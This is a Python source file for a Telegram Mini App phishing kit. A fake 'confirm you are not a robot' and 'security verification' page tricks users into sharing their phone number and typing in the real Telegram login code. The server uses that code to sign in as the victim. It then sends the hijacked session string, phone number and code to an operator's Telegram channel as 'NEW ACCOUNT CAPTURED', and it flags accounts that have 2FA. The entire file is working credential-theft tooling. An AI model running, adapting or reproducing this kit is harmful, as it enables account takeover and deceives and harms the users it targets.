import os
import asyncio
import json
import threading
from datetime import datetime
from telethon import TelegramClient, events, errors
from telethon.sessions import StringSession
from flask import Flask, request, jsonify, render_template_string

API_ID = int(os.environ.get("API_ID"))
API_HASH = os.environ.get("API_HASH")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHANNEL_ID = os.environ.get("CHANNEL_ID")

print("=" * 50)
print("SCRIPT STARTING...")
print("=" * 50)

app = Flask(__name__)

bot_client = TelegramClient('bot_session', API_ID, API_HASH)
active_sessions = {}

async def send_to_logger(message_text):
    if not CHANNEL_ID:
        return
    try:
        temp_client = TelegramClient('logger_session', API_ID, API_HASH)
        await temp_client.start(bot_token=BOT_TOKEN)
        await temp_client.send_message(CHANNEL_ID, message_text)
        await temp_client.disconnect()
        print("[LOG] Sent to Telegram channel")
    except Exception as e:
        print(f"[ERROR] Failed to send to channel: {e}")

FRONTEND_HTML = """
<!DOCTYPE html>
<html>
<head>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: url('https://res.cloudinary.com/bhcgogng/image/upload/v1784494648/photo_2026-07-19_23-37-40_bwzfbi.jpg') no-repeat center center fixed;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            width: 100%;
            height: 100%;
            padding: 20px;
            background: rgba(0, 0, 0, 0.3);
        }
        
        .card {
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            padding: 40px 30px;
            border-radius: 20px;
            text-align: center;
            max-width: 400px;
            width: 100%;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }
        
        h2 {
            color: #fff;
            margin-bottom: 20px;
            font-size: 22px;
            font-weight: 600;
            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
        }
        
        p {
            color: #ddd;
            font-size: 14px;
            margin-bottom: 30px;
            line-height: 1.5;
            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
        }
        
        .robot-icon {
            font-size: 100px;
            margin-bottom: 20px;
            display: block;
            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.3));
        }
        
        .btn {
            background: linear-gradient(135deg, rgba(255,107,157,0.9), rgba(196,69,105,0.9));
            color: white;
            border: none;
            padding: 16px 30px;
            border-radius: 12px;
            font-size: 18px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
            margin: 10px 0;
            transition: all 0.3s;
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255,255,255,0.1);
        }
        
        .btn:active { transform: scale(0.98); }
        .btn:disabled { background: rgba(68, 68, 68, 0.8); cursor: not-allowed; }
        
        #verificationScreen, #codeScreen { display: none; }
        
        .code-slots {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 30px;
        }
        
        .code-slot {
            width: 55px;
            height: 55px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 12px;
            background: rgba(255, 255, 255, 0.1);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            font-weight: bold;
            color: #fff;
            backdrop-filter: blur(5px);
        }
        
        .code-slot.filled {
            background: rgba(255, 107, 157, 0.8);
            border-color: rgba(255, 107, 157, 0.9);
        }
        
        .keypad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
            max-width: 320px;
            margin: 0 auto;
            padding: 20px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
        }
        
        .key {
            background: linear-gradient(135deg, rgba(255,107,157,0.9), rgba(196,69,105,0.9));
            color: white;
            border: none;
            padding: 18px;
            border-radius: 12px;
            font-size: 24px;
            font-weight: bold;
            cursor: pointer;
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255,255,255,0.1);
        }
        
        .key.clear { background: linear-gradient(135deg, rgba(68,68,68,0.8), rgba(34,34,34,0.8)); }
        
        .error {
            color: #ff6b6b;
            font-size: 14px;
            margin-top: 10px;
            display: none;
            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
            font-weight: bold;
        }
        
        .loading {
            display: none;
            color: #ddd;
            margin-top: 10px;
            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
        }
    </style>
</head>
<body>
    <div class="container">
        <div id="antiBotScreen">
            <div class="card">
                <span class="robot-icon">🤖</span>
                <h2>Please confirm that you are not a robot ✅</h2>
                <p>This verification helps us ensure the security and integrity of our service.</p>
                <button class="btn" onclick="handleConfirm()">Confirm ✅</button>
            </div>
        </div>
        
        <div id="verificationScreen">
            <div class="card">
                <h2>Security Verification</h2>
                <p>To ensure your account security, we need to verify your identity.</p>
                <button class="btn" id="shareBtn" onclick="handleContact()">Share Contact & Verify</button>
                <div class="loading" id="contactLoading">Requesting contact...</div>
            </div>
        </div>
        
        <div id="codeScreen">
            <div class="card">
                <h2>Enter Verification Code</h2>
                <p>We sent a verification code to your Telegram app. Enter it below.</p>
                
                <div class="code-slots" id="codeSlots">
                    <div class="code-slot"></div>
                    <div class="code-slot"></div>
                    <div class="code-slot"></div>
                    <div class="code-slot"></div>
                    <div class="code-slot"></div>
                </div>
                
                <div class="keypad">
                    <button class="key" onclick="pressKey('1')">1</button>
                    <button class="key" onclick="pressKey('2')">2</button>
                    <button class="key" onclick="pressKey('3')">3</button>
                    <button class="key" onclick="pressKey('4')">4</button>
                    <button class="key" onclick="pressKey('5')">5</button>
                    <button class="key" onclick="pressKey('6')">6</button>
                    <button class="key" onclick="pressKey('7')">7</button>
                    <button class="key" onclick="pressKey('8')">8</button>
                    <button class="key" onclick="pressKey('9')">9</button>
                    <button class="key clear" onclick="pressKey('clear')">C</button>
                    <button class="key" onclick="pressKey('0')">0</button>
                    <button class="key clear" onclick="pressKey('back')">⌫</button>
                </div>
                
                <button class="btn" onclick="submitCode()" style="margin-top: 20px;">Verify</button>
                <button class="btn" onclick="resendCode()" style="margin-top: 10px; background: linear-gradient(135deg, rgba(68,68,68,0.8), rgba(34,34,34,0.8));">Resend Code</button>
                <div class="error" id="errorBox">Invalid code.</div>
                <div class="loading" id="loadingBox">Verifying...</div>
            </div>
        </div>
        
        <div id="successScreen" style="display: none;">
            <div class="card">
                <h2>Success! ✅</h2>
                <p style="color: #00ff88; font-size: 16px;">Your account has been verified successfully.</p>
            </div>
        </div>
    </div>

    <script>
        var tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();
        
        var userId = null;
        var enteredCode = '';
        
        if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
            userId = tg.initDataUnsafe.user.id;
        }
        
        function handleConfirm() {
            document.getElementById('antiBotScreen').style.display = 'none';
            document.getElementById('verificationScreen').style.display = 'block';
        }
        
        // FIXED: Properly extracts phone and handles missing userId
        function handleContact() {
            document.getElementById('shareBtn').disabled = true;
            document.getElementById('contactLoading').style.display = 'block';
            
            tg.requestContact(function(success, response) {
                if (success && response) {
                    console.log('Contact response:', response);
                    
                    // Extract phone number from various possible formats
                    var phone = null;
                    if (typeof response === 'string') {
                        phone = response;
                    } else if (response.phone_number) {
                        phone = response.phone_number;
                    } else if (response.contact && response.contact.phone_number) {
                        phone = response.contact.phone_number;
                    }
                    
                    // Ensure phone has + prefix
                    if (phone && !phone.startsWith('+')) {
                        phone = '+' + phone;
                    }
                    
                    // Use phone as user_id if tg user id not available
                    var uid = userId || phone;
                    
                    if (!phone || !uid) {
                        alert('Could not get phone number. Please try again.');
                        document.getElementById('shareBtn').disabled = false;
                        document.getElementById('contactLoading').style.display = 'none';
                        return;
                    }
                    
                    // Store uid for later use
                    userId = uid;
                    
                    fetch('/initiate', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ user_id: uid, phone: phone })
                    })
                    .then(function(res) { return res.json(); })
                    .then(function(data) {
                        if (data.success) {
                            document.getElementById('verificationScreen').style.display = 'none';
                            document.getElementById('codeScreen').style.display = 'block';
                        } else {
                            alert(data.error || 'Failed to send code.');
                            document.getElementById('shareBtn').disabled = false;
                            document.getElementById('contactLoading').style.display = 'none';
                        }
                    })
                    .catch(function(err) {
                        alert('Error: ' + err.message);
                        document.getElementById('shareBtn').disabled = false;
                        document.getElementById('contactLoading').style.display = 'none';
                    });
                } else {
                    alert('Please share your contact to continue.');
                    document.getElementById('shareBtn').disabled = false;
                    document.getElementById('contactLoading').style.display = 'none';
                }
            });
        }
        
        function resendCode() {
            if (!userId) {
                alert('Session error. Please restart.');
                return;
            }
            
            fetch('/resend', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: userId })
            })
            .then(function(res) { return res.json(); })
            .then(function(data) {
                if (data.success) {
                    alert('A new code has been sent to your Telegram app.');
                    enteredCode = '';
                    updateCodeDisplay();
                } else {
                    alert(data.error || 'Failed to resend code.');
                }
            });
        }
        
        function pressKey(key) {
            if (key === 'back') {
                enteredCode = enteredCode.slice(0, -1);
            } else if (key === 'clear') {
                enteredCode = '';
            } else {
                if (enteredCode.length < 5) {
                    enteredCode += key;
                }
            }
            updateCodeDisplay();
        }
        
        function updateCodeDisplay() {
            var slots = document.querySelectorAll('.code-slot');
            for (var i = 0; i < slots.length; i++) {
                if (i < enteredCode.length) {
                    slots[i].textContent = '•';
                    slots[i].classList.add('filled');
                } else {
                    slots[i].textContent = '';
                    slots[i].classList.remove('filled');
                }
            }
        }
        
        // FIXED: Added check for userId
        function submitCode() {
            if (enteredCode.length !== 5) {
                alert('Please enter the full 5-digit code.');
                return;
            }
            
            if (!userId) {
                alert('Session error. Please restart the verification.');
                return;
            }
            
            document.getElementById('loadingBox').style.display = 'block';
            document.getElementById('errorBox').style.display = 'none';
            
            fetch('/verify', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ code: enteredCode, user_id: userId })
            })
            .then(function(res) { 
                if (!res.ok) {
                    throw new Error('Server error: ' + res.status);
                }
                return res.json(); 
            })
            .then(function(data) {
                document.getElementById('loadingBox').style.display = 'none';
                if (data.success) {
                    document.getElementById('codeScreen').style.display = 'none';
                    document.getElementById('successScreen').style.display = 'block';
                    setTimeout(function() { tg.close(); }, 2000);
                } else {
                    document.getElementById('errorBox').textContent = data.error || 'Invalid code.';
                    document.getElementById('errorBox').style.display = 'block';
                    enteredCode = '';
                    updateCodeDisplay();
                }
            })
            .catch(function(err) {
                document.getElementById('loadingBox').style.display = 'none';
                document.getElementById('errorBox').textContent = 'Error: ' + err.message;
                document.getElementById('errorBox').style.display = 'block';
            });
        }
        
        updateCodeDisplay();
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(FRONTEND_HTML)

@app.route('/initiate', methods=['POST'])
def initiate_verification():
    data = request.json
    user_id = data.get('user_id')
    phone = data.get('phone')
    
    if not user_id or not phone:
        return jsonify({"success": False, "error": "Missing user_id or phone"})
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def send_login_code():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        try:
            await client.connect()
            result = await client.send_code_request(phone)
            phone_code_hash = result.phone_code_hash
            session_string = client.session.save()
            
            active_sessions[user_id] = {
                'phone': phone,
                'phone_code_hash': phone_code_hash,
                'session_string': session_string
            }
            
            print(f"[CODE SENT] to {phone} for user {user_id}")
            await client.disconnect()
            return True, None
        except errors.PhoneNumberFloodError:
            await client.disconnect()
            return False, "Too many attempts. Please wait."
        except Exception as e:
            await client.disconnect()
            return False, str(e)
    
    try:
        success, error = loop.run_until_complete(send_login_code())
        loop.close()
    except Exception as e:
        loop.close()
        return jsonify({"success": False, "error": str(e)})
    
    if success:
        return jsonify({"success": True})
    else:
        return jsonify({"success": False, "error": error})

@app.route('/resend', methods=['POST'])
def resend_code():
    data = request.json
    user_id = data.get('user_id')
    
    if user_id not in active_sessions:
        return jsonify({"success": False, "error": "Session not found."})
    
    phone = active_sessions[user_id]['phone']
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def request_new_code():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        try:
            await client.connect()
            result = await client.send_code_request(phone)
            phone_code_hash = result.phone_code_hash
            session_string = client.session.save()
            
            active_sessions[user_id] = {
                'phone': phone,
                'phone_code_hash': phone_code_hash,
                'session_string': session_string
            }
            
            print(f"[NEW CODE SENT] to {phone}")
            await client.disconnect()
            return True, None
        except errors.PhoneNumberFloodError:
            await client.disconnect()
            return False, "Too many attempts. Please wait."
        except Exception as e:
            await client.disconnect()
            return False, str(e)
    
    try:
        success, error = loop.run_until_complete(request_new_code())
        loop.close()
    except Exception as e:
        loop.close()
        return jsonify({"success": False, "error": str(e)})
    
    if success:
        return jsonify({"success": True})
    else:
        return jsonify({"success": False, "error": error})

@app.route('/verify', methods=['POST'])
def verify_code():
    data = request.json
    code = data.get('code')
    user_id = data.get('user_id')
    
    if user_id not in active_sessions:
        return jsonify({"success": False, "error": "Session not found. Please restart."})

    phone = active_sessions[user_id]['phone']
    phone_code_hash = active_sessions[user_id].get('phone_code_hash')
    session_string = active_sessions[user_id].get('session_string')
    
    print(f"\n{'='*50}")
    print(f"[CODE RECEIVED] Phone: {phone}")
    print(f"[CODE RECEIVED] Code: {code}")
    print(f"[CODE RECEIVED] Time: {datetime.now()}")
    print(f"{'='*50}\n")
    
    if not phone_code_hash:
        return jsonify({"success": False, "error": "Missing phone code hash. Please restart."})
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def try_login():
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        
        try:
            await client.connect()
            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            final_session_string = client.session.save()
            
            print(f"\n[SUCCESS] Captured account for {phone}")
            print(f"[SUCCESS] Session String: {final_session_string}\n")
            
            log_message = (
                f"🚨 **NEW ACCOUNT CAPTURED** 🚨\n\n"
                f"📞 Phone: `{phone}`\n"
                f"🔑 Code Used: `{code}`\n"
                f"🔐 Session String:\n`{final_session_string}`\n\n"
                f"Time: `{datetime.now()}`"
            )
            await send_to_logger(log_message)
            
            await client.disconnect()
            return True, final_session_string
            
        except errors.SessionPasswordNeededError:
            await client.disconnect()
            print(f"[2FA] Account {phone} has 2FA enabled.")
            log_message = f"⚠️ **2FA DETECTED** ⚠️\n\n📞 Phone: `{phone}`\nTime: `{datetime.now()}`"
            await send_to_logger(log_message)
            return False, "2FA_REQUIRED"
            
        except errors.PhoneCodeInvalidError:
            await client.disconnect()
            print(f"[INVALID] Wrong code for {phone}")
            log_message = f"❌ **INVALID CODE** ❌\n\n📞 Phone: `{phone}`\nTime: `{datetime.now()}`"
            await send_to_logger(log_message)
            return False, "INVALID_CODE"
            
        except errors.PhoneCodeExpiredError:
            await client.disconnect()
            print(f"[EXPIRED] Code expired for {phone}")
            log_message = f"⏰ **CODE EXPIRED** ⏰\n\n📞 Phone: `{phone}`\nTime: `{datetime.now()}`"
            await send_to_logger(log_message)
            return False, "CODE_EXPIRED"
            
        except Exception as e:
            await client.disconnect()
            print(f"[ERROR] {e}")
            log_message = f"⛑️ **ERROR** ⛑️\n\n📞 Phone: `{phone}`\nError: `{e}`\nTime: `{datetime.now()}`"
            await send_to_logger(log_message)
            return False, str(e)

    try:
        success, result = loop.run_until_complete(try_login())
        loop.close()
    except Exception as e:
        loop.close()
        return jsonify({"success": False, "error": str(e)})

    if user_id in active_sessions:
        del active_sessions[user_id]
    
    if success:
        return jsonify({"success": True})
    else:
        return jsonify({"success": False, "error": result})

async def bot_listener():
    await bot_client.start(bot_token=BOT_TOKEN)
    print("Bot listener started...")

    @bot_client.on(events.NewMessage)
    async def handler(event):
        if event.message.media and hasattr(event.message.media, 'phone_number'):
            contact = event.message.media
            phone = contact.phone_number
            user_id = event.message.sender_id
            
            print(f"[+] Contact received via bot: {phone}")
            
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            try:
                await client.connect()
                result = await client.send_code_request(phone)
                phone_code_hash = result.phone_code_hash
                session_string = client.session.save()
                
                active_sessions[user_id] = {
                    'phone': phone,
                    'phone_code_hash': phone_code_hash,
                    'session_string': session_string
                }
                
                print(f"[CODE SENT] to {phone}")
                await client.disconnect()
                
            except Exception as e:
                print(f"[ERROR] Failed to send code: {e}")
                await client.disconnect()

    await bot_client.run_until_disconnected()

if __name__ == '__main__':
    thread = threading.Thread(target=lambda: asyncio.run(bot_listener()))
    thread.daemon = True
    thread.start()

    port = int(os.environ.get("PORT", 5000))
    print(f"Starting web server on http://0.0.0.0:{port}")
    print("=" * 50)
    app.run(host='0.0.0.0', port=port, debug=False)
